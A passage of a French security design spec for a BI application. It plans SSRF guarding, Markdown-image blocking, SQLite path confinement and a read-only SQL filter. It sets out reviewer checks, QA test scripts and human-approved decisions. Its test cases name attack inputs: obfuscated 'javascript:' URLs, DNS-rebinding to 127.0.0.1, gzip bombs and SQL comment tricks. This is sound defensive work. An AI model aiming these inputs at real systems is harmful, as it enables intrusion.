| R-6 | Export `.md` du rapport contient les images/liens bruts : ouverture dans un autre lecteur Markdown hors appli | Faible | Hors périmètre ; suite : nettoyer l'export (remplacer `![…](…)` par le marqueur) |
| R-7 | `safeFetch` (client HTTP maison) : bogues de décompression, de flux SSE ou de gestion d'erreurs | Moyen | Tests § 9.2/9.3 ; flux LLM testé avec un serveur SSE local en liste blanche |
| R-8 | Allowlist par **nom** : un nom autorisé dont le DNS est détourné peut viser une IP interne (accepté par conception) | Faible | Documenté ; préférer des entrées IP/CIDR pour les cibles internes |
| R-9 | `next.config.mjs` : la CSP s'applique aussi aux réponses `/api/*` | Nul | Sans effet fonctionnel |
| Perf | Résolution DNS supplémentaire par appel ; pas de pool (inchangé) ; bundle client : +~1 kB (SafeMarkdown), CSP sans effet | Faible | — |

---

## 8. Points de vigilance pour la revue (`reviewer`)

1. **C1** : aucun `<img>` rendu quelle que soit la syntaxe (inline, référence, autolien d'image, HTML brut) ; `urlTransform` testé contre casse/espaces/caractères de contrôle (`" JaVaScRiPt:"`, `"java\tscript:"`) ; pas de `{...props}` propagé sur `<a>` ; aucun `rehype-raw`/`dangerouslySetInnerHTML` introduit ; plus aucun import de `react-markdown` hors `SafeMarkdown.tsx`.
2. **CSP** : valeur exacte `img-src 'self' data: blob:` ; pas de `default-src` ajouté par mégarde ; pas d'`unsafe-*`.
3. **SQLite** : ouverture du **realpath** renvoyé (pas de l'entrée) ; confinement via `path.relative` (pas `startsWith` sans séparateur : `/srv/sqlite2` ≠ `/srv/sqlite`) ; refus du lien symbolique final **et** des dossiers liés sortants ; garde-fou `BI_SQLITE_DIR` ≠ `data/` ; messages sans chemin.
4. **SSRF — épinglage** : la connexion utilise l'adresse validée (lookup), contrôle de **toutes** les adresses résolues, IP littérales contrôlées sans `lookup`, IPv4 embarquées en IPv6, plages toujours interdites non débloquables, échec fermé sur valeur de politique inconnue.
5. **SSRF — couverture** : tous les `fetch(` serveur pilotés par une donnée client passent par `safeFetch` (rechercher `fetch(` dans `src/server/**` : seuls restent les appels vers hôtes constants Anthropic/Gemini/OpenAI/DeepSeek/NVIDIA officiels) ; pilotes SQL/Mongo contrôlés **avant** connexion ; `c.url` SQL refusé ; options Mongo interdites ; `Host` non forçable ; pas de redirection suivie ; plafond de taille après décompression.
6. **Non-verbosité** : plus de corps distant ni de `cause.message` brut dans `saas.ts`/`llm.ts` ; `ensureOk` sans `JSON.stringify(j)` ; aucune URL/en-tête/clé dans les logs (invariant BYOK n° 2).
7. **Lecture seule** : analyseur lexical conforme au tableau T-13 **par dialecte** (piège : `\` dans les chaînes PG standard ; `--` MySQL sans espace ; `#` = table temporaire en MSSQL, pas un commentaire) ; contrôles appliqués au code masqué ; `queryMode: 'extended'` + `DECLARE CURSOR` en PG ; `ROLLBACK` systématique en MSSQL même en cas d'erreur ; `sql_select_limit` + flux en MySQL ; `stmt.readonly` en SQLite ; `-LOCAL_FILES` et `multipleStatements: false` en MySQL.
8. **Invariants** : connecteurs RO (renforcé, n° 1), BYOK (n° 2), session `requireAuth` conservée en tête de chaque route modifiée (n° 4), aucun accès à `data/` (n° 6 ; seul `realpath(BI_DATA_DIR)` est calculé pour l'exclure, sans lecture de contenu).
9. **Qualité** : pas de `catch {}` muet ajouté dans le nouveau code (au minimum un commentaire justifié) ; lignes raisonnables ; TS strict sans `any` nouveau ; modules § 2.1 en syntaxe effaçable.

---

## 9. Stratégie de test suggérée au QA (sans framework installé)

> À confirmer par le QA. Aucun `npm install` : on s'appuie sur Node 24 (exécution native de `.ts` avec types effaçables) et sur des appels HTTP à `npm run dev`.

### 9.1 Pré-requis
- `npx tsc --noEmit` et `npm run build` verts.
- Serveur de test isolé : `BI_DATA_DIR=<dossier temporaire du scratchpad>`, `ADMIN_EMAIL=qa@local.test`, `ADMIN_PASSWORD=<mot de passe de test>` → compte jetable ; **ne pas** utiliser `data/` ni `AUTH_DISABLED`. Créer en plus un compte de rôle `user` via `/admin` pour vérifier que les gardes s'appliquent aussi aux non-admins.
- Session : `curl -c jar -H 'content-type: application/json' -d '{"email":…,"password":…}' http://localhost:3000/api/auth/login` puis `curl -b jar …` (pas d'en-tête `Origin` ⇒ contrôle CSRF passant).

### 9.2 Scripts de vérification unitaires (Node natif)
Emplacement proposé : `scripts/security/*.check.mjs` (fichiers `.mjs` important directement `src/**/*.ts` avec extension ; non inclus dans `tsc` car JS). Lancement : `node scripts/security/<nom>.check.mjs` ; code de sortie ≠ 0 en cas d'échec ; `node:assert/strict`.
- `markdown-safety.check.mjs` : table de cas de `safeUrlTransform` (§ 1 US-1 + variantes casse/contrôles).
- `net-policy.check.mjs` : classification de chaque plage (§ T-6) ; IPv4 mappées ; liste blanche (nom, `*.`, port, IP, CIDR, IPv6) ; mode `allowlist` ; valeur de politique inconnue ; **rebinding** : `resolveAllowed`/`guardedLookup` avec résolveur simulé renvoyant `[public, 127.0.0.1]` (refus) et résolveur à états (1ᵉʳ appel public, 2ᵉ interne) en vérifiant que l'adresse rendue au connect est celle contrôlée ; URIs Mongo (multi-hôtes, IPv6, `+srv` avec `resolveSrv` simulé, options interdites, socket).
- `safe-fetch.check.mjs` : serveurs `node:http` locaux sur `127.0.0.1` lancés par le script : (a) sans liste blanche → refus **et** zéro requête reçue par le serveur témoin ; (b) `BI_ALLOWED_HOSTS=127.0.0.1:<port>` → 200 OK ; 302 → E-NET-3 ; gzip/br décompressés ; corps > 20 Mo et bombe gzip → E-NET-4 ; flux SSE lu progressivement ; délai dépassé.
- `sqlite-path.check.mjs` : arborescence temporaire (fichiers, `..`, absolu interne/externe, lien symbolique fichier et dossier — sous Windows, création de lien nécessitant le mode développeur : sinon cas marqué « non exécutable » avec justification, pas ignoré silencieusement), `BI_SQLITE_DIR` absent, `BI_SQLITE_DIR` = data.
- `sql-guard.check.mjs` : tous les exemples § 1 US-4 (refus et faux positifs) × dialectes + cas pièges (`E'\''` PG, `'\'` PG standard, `--x` MySQL, `#temp` MSSQL, `$tag$…$tag$`, chaîne non terminée).
- ⚠️ Ces scripts sont des **fichiers de test créés par le QA** (pas de dépendance) ; leur ajout dans `package.json` (script `check:security`) nécessiterait une validation humaine (fichier sensible) → simple lancement manuel dans ce sprint.

### 9.3 Scénarios d'intégration HTTP (`npm run dev`)
- US-3 : tableau d'URL REST/Odoo/LLM/hôtes SQL/URI Mongo du § 1 via `curl` sur `/api/connectors/{test,fetch,schema,query}` et `/api/llm/test` ; serveur témoin `node -e "require('http').createServer((q,s)=>{console.log('HIT',q.url);s.end('{}')}).listen(8099)"` pour prouver l'absence de connexion ; NIM simulé (serveur SSE local OpenAI-compatible) en liste blanche pour `/api/llm/chat`.
- US-2 : base SQLite créée par script (`better-sqlite3`, déjà installé) dans le dossier temporaire ; empreinte SHA-256 avant/après requêtes.
- US-5 : `curl -I http://localhost:3000/` ; parcours UI du § 1 avec console ouverte.
- US-1 : injection contrôlée dans le navigateur — DevTools > Application > `localStorage` : éditer la session persistée de l'utilisateur pour ajouter un message assistant contenant les cas du § 1, recharger, vérifier l'onglet Réseau (filtre `example.com`) et le DOM ; idem dans le rapport (régénéré par Demo Advisor puis cas du rapport vérifié via la même injection ou par le script `markdown-safety`).
- US-4 SGBD réels : nécessitent des instances PostgreSQL/MySQL/SQL Server **de test** (conteneurs locaux). ⚠️ Lancement de conteneurs / téléchargement d'images = action à fort impact → **validation humaine**. À défaut : couverture par `sql-guard.check.mjs` + SQLite réel + revue de code renforcée, et scénarios SGBD marqués « non exécutés — en attente d'environnement » (pas « OK »).
- Clés LLM réelles (non-régression fournisseurs officiels) : appel réseau tiers → **validation humaine**.

### 9.4 Non-régression
Onboarding démo (3 sources locales), chat Demo Advisor, widgets, exports PNG/CSV/Excel/PDF, import XLSX/CSV/PDF/DOCX, Google Sheets (si identifiants de test disponibles), thème/palettes, administration (utilisateurs, audit).

---

## 10. ⚠️ VALIDATION HUMAINE REQUISE (à approuver à la GATE 2)

| ID | Action | Fichiers / systèmes | Raison | Réversibilité |
|---|---|---|---|---|
| V-1 | Ajout d'une fonction `headers()` (CSP `img-src`) | `next.config.mjs` | US-5 / C1 défense en profondeur | Totale (retrait du bloc) |
| V-2 | Modification des garde-fous lecture seule et de l'exécution SQL | `src/server/connectors/sql.ts`, nouveau `sql-guard.ts`, `sqlite-path.ts`, `index.ts` | US-2, US-4 | Totale (revert) ; **change le comportement** (`SHOW`/`EXPLAIN`/`/* */` refusés) |
| V-3 | Nouvelles variables d'environnement `BI_NETWORK_POLICY`, `BI_ALLOWED_HOSTS`, `BI_SQLITE_DIR` + documentation `.env.example` | `.env.example`, README | US-2, US-3 | Totale ; **changement cassant** pour les installations utilisant des cibles internes / SQLite (R-1) |
| V-4 | Politique par défaut « public » (destinations internes bloquées sans liste blanche) et SQLite désactivé sans `BI_SQLITE_DIR` | comportement serveur | ADR-S1-02, ADR-S2-01 | Totale via configuration |
| V-5 | Modification des connecteurs `saas.ts`, `odoo.ts`, `mongo.ts` (garde réseau, options Mongo interdites, en-têtes interdits) | `src/server/connectors/**` | US-3 | Totale |
| V-6 | Refactorisation touchant ~14 fichiers (dont 6 nouveaux) | cf. § 2.2 | Seuil « > ~5 fichiers » de CLAUDE.md § 5 | Totale (branche dédiée) |
| V-7 | (Tests) lancement de conteneurs SGBD de test et appels réels aux fournisseurs LLM | Docker / réseau tiers | Couverture US-3/US-4 complète | — |
| — | **Aucune dépendance ajoutée** (alternative `undici` écartée, ADR-S1-01). Si l'humain préfère `undici`, cela devient une validation supplémentaire (`package.json`). | — | — | — |

Questions ouvertes à trancher à la GATE 2 :
- **Q-1** : la politique par défaut doit-elle être `public` (proposée) ou `allowlist` (plus sûre, plus contraignante) ?
- **Q-2** : réserver la création/l'usage des connecteurs serveur (SQL, Mongo, Odoo, REST) au rôle admin ? (non conçu dans ce sprint ; suite proposée)
- **Q-3** : accepter la livraison en deux temps (US-1/US-5/US-2 d'abord, puis US-3/US-4) ?

---

## 11. Suites (hors périmètre, pour le backlog)

- **C2** (P1) : durcir alasql (AST `alasql.parse`, refus `INTO`, `->`, fonctions fichier/réseau) + test.
- **S4** (P1) : liste blanche d'étapes Mongo, refus récursif `$where`/`$function`, `maxTimeMS`, collections `system.*`, `directConnection`/épinglage (R-2).
- **C3** (P1) : clé maîtresse du coffre par utilisateur ; correctif « Réinitialiser ».
- **S5/S6** (P1) : rate-limit fiable (`TRUST_PROXY`), journal d'audit assaini (et éventuel événement `network_blocked` une fois S6 traité).
- **S9 complet** (P2) : CSP complète avec nonce (middleware), `frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, HSTS.
- **S10** (P2) : `friendly()` sans repli brut, codes HTTP d'erreur corrects, validation `zod`, vérification des certificats TLS (PG/MSSQL) activée par défaut, blocage `AUTH_DISABLED` en production.
- **R-4** : exécution SQLite en `worker_threads` avec délai ; **R-6** : nettoyage de l'export `.md`.
- Admin : affichage de la politique réseau active ; indicateur « résultat tronqué à 1 000 lignes » dans l'UI.
- Outillage (P2) : Vitest + migration des scripts `scripts/security/*.check.mjs` en tests ; ESLint/Prettier.
- Mises à jour `xlsx`/`jspdf` (P1).

---

## 12. Note pour l'UX/UI (étape sautée par l'orchestrateur)

L'impact visuel est faible mais **4 micro-copies** sont introduites ; une relecture rapide UX (non bloquante) est recommandée lors de la recette :
1. Marqueur d'image : « Image non affichée (protection des données) : `<alt>` » (icône `ImageOff`, style discret `text-muted`, lisible en thèmes clair/sombre et dans le PDF).
2. Info-bulle de lien : « Lien externe vers `<hôte>` » (envisager aussi un `aria-label` équivalent).
3. Formulaire SQLite : « Fichier SQLite (dans le dossier autorisé par l'administrateur) », placeholder `ventes.sqlite`.
4. Mention lecture seule du formulaire SQL : « Utilisez obligatoirement un compte en lecture seule : c'est la seule garantie réelle côté base. »

---

## Décisions GATE 2 (validation humaine — 2026-11-10)

- Conception **validée**, livraison en **un seul lot** (US-1 à US-5, T-1 à T-17).
- Points V-1 à V-6 acceptés (next.config.mjs, garde-fous lecture seule, nouvelles variables d'environnement, changements cassants, ~14 fichiers).
- Q-1 : politique réseau par défaut **`public`**.
- Q-2 : réservation des connecteurs serveur aux admins **reportée** (suite P1).
- Q-3 : sans objet (lot unique).
- V-7 (tests sur SGBD réels / LLM réels) : **non accordé à ce stade** — à redemander par le QA le cas échéant.
